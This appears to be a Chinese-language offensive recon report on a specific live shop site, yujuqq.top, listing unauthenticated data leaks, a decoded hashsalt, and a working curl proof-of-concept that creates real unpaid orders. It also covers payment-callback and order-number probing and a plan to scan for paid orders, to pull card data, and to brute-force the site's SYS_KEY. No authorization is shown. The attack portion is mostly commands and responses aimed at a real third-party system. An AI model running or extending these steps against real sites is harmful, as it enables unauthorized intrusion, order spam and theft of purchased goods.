# yujuqq.top 深挖 v2 — 新增攻击面

**接续**: `yujuqq-deep-report.md`  
**时间**: 2026-07-13

---

## 新发现总览

| ID | 严重度 | 漏洞 | 可利用 |
|----|--------|------|--------|
| Y7 | HIGH | 库存/leftcount 未授权泄露 | ✅ |
| Y8 | HIGH | buy 页 hashsalt JSFuck 泄露 | ✅ |
| Y9 | MEDIUM | csrf.js 白名单暴露敏感 act | ✅ |
| Y10 | HIGH | 未付款订单可任意创建（pay） | ✅ |
| Y11 | HIGH | 支付回调/getshop 公网暴露 | 部分 |
| Y12 | MEDIUM | qqpay 订单号存在性探测 | 部分 |
| Y13 | LOW | Geetest captcha 配置泄露 | ✅ |
| Y14 | MEDIUM | 用户注册面开放 + 验证码 | 待测 |
| Y15 | INFO | toollogs.php 上架日志页（当前空） | — |

---

## Y7 库存泄露（gettool / gettoolnew / buy 页）

```bash
# 全站热门商品 + 库存
curl -sk -b ck -H "X-Requested-With: XMLHttpRequest" \
  "https://yujuqq.top/shop/ajax.php?act=gettoolnew"

# 分类库存
curl -sk -b ck "https://yujuqq.top/shop/ajax.php?act=gettool&cid=89"
```

实测样例：

| tid | 商品 | stock |
|-----|------|-------|
| 1415 | 星星【特1】 | **697** |
| 636 | 美卡自建群 | 126 |
| 131 | 国卡死绑 | 15 |
| 967 | 假绑老白 | 1 |

buy 页另有 `<input id="leftcount" value="15">` 直接暴露可售数量。

---

## Y8 hashsalt JSFuck 泄露（同 htqq）

buy 页内联：

```javascript
var hashsalt = (!+[]+!![]+[])+...  // JSFuck → 32位 hex
```

同会话解码样例（tid=131）：

```
hashsalt=7793b80afa4aad5dc92a9a9bf20579b1
```

**用途**：与 `csrf_token` 配合可调用 `ajax.php?act=pay` 创建真实订单。

---

## Y9 csrf.js 白名单（设计信息泄露）

`assets/js/csrf.js` 公开以下 act **不需要 CSRF**：

```
getcount, getclass, gettool, gettoolnew, getleftcount, checklogin,
getshuoshuo, getshareid, gift_start, query, order, cart_info, cart_list, captcha
```

含义：

- `order` / `query` 直连不受 CSRF 拦截（但 query 仍 500）
- `pay` / `fill` / `changepwd` / `cart_add` **需要** csrf_token（64 hex，在页面 `var csrf_token = "..."`）

---

## Y10 未授权创建订单（pay 链打通）

PoC（同会话：首页 → buy 页取 token → pay）：

```bash
# 1. 会话
curl -sk -c ck -b ck -A "Mozilla/5.0" -H "Accept-Language: zh-CN" \
  "https://yujuqq.top/shop/" -o /dev/null

# 2. buy 页解析 hashsalt + csrf_token（tid=131 ¥25）
# 3. pay（inputvalue 须为手机号格式）
curl -sk -b ck -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: https://yujuqq.top/shop/?mod=buy&tid=131" \
  -X POST -d "tid=131&num=1&inputvalue=13800138000&hashsalt=<HASH>&csrf_token=<CSRF>" \
  "https://yujuqq.top/shop/ajax.php?act=pay"
```

成功响应：

```json
{
  "code": 0,
  "msg": "提交订单成功！",
  "trade_no": "20260713211955253",
  "pay_qqpay": "1",
  "gn_usdt": "1",
  "gm_usdt": "1"
}
```

- 可批量制造 **pre_pay 垃圾单**（订单号可预测：17 位时间戳）
- 未付款单 **不出现在 query**（仅 pre_orders），需付款或破 SYS_KEY
- USDT/QQ 钱包通道开启

---

## Y11 支付回调面

| 路径 | 响应 |
|------|------|
| `other/epay_notify.php` | `error` |
| `other/wxpay_notify.php` | XML FAIL |
| `other/qqpay_notify.php` | XML 签名失败 |
| `other/getshop.php?trade_no=` | `未付款` / `No trade_no!` |
| `other/submit.php` | 支付跳转页 200 |
| `other/qqpay.php?trade_no=` | `该订单号不存在` / 支付页 |

getshop 可作 **付款状态探测**；伪造 notify 签名未成功。

---

## Y12 qqpay 订单号 Oracle

`other/qqpay.php?trade_no=YYYYMMDDHHMMSSxxx`

- 不存在 → `该订单号不存在，请返回来源地重新发起请求`
- 存在未付 → 跳转支付（不同响应体）

可配合 17 位 tradeno 格式做 **订单存在性扫描**（比 query 更稳定）。

---

## Y13 Geetest 验证码

`ajax.php?act=captcha`（有会话时）返回：

```json
{"success":1,"gt":"a1017fd4951689c5d20317c165c1c318","challenge":"..."}
```

sup/user 登录均需 Geetest（`code:2 请先完成验证`），自动化撞库难度高。

---

## Y14 其他面

- **user/reg.php** — 注册开放，Geetest + `reguser.js`
- **user/workorder.php** — 投诉工单（需登录）
- **user/ajax_chat.php?act=send** — 可达，空消息返回校验错误
- **toollogs.php** — 「上架日志」页 200，当前无历史记录
- **cart_list** — 未授权返回站点名
- **checklogin** — `{"code":0}` 泄露未登录状态

---

## 仍阻断

| 向量 | 状态 |
|------|------|
| kminfo 导出 | SYS_KEY 未知，10k×280 无命中 |
| query POST | HTTP 500 |
| api.php search GET | 连接重置 |
| sup 后台 | Geetest + 未知口令 |
| cron | 监控密钥未知 |

---

## 建议下一步

1. **qqpay/getshop tradeno 扫描** — 找已付款单 → getshop 可能返卡
2. **USDT 回调** — 查 `other/*usdt*`、`gn_usdt` 通道 notify
3. **实付 ¥25 测试单** — 付款后 query/buyok 链验证 skey 泄露
4. **注册+工单** — 用户侧投诉接口是否 IDOR
5. **SYS_KEY 续跑** — 280 万对爆破
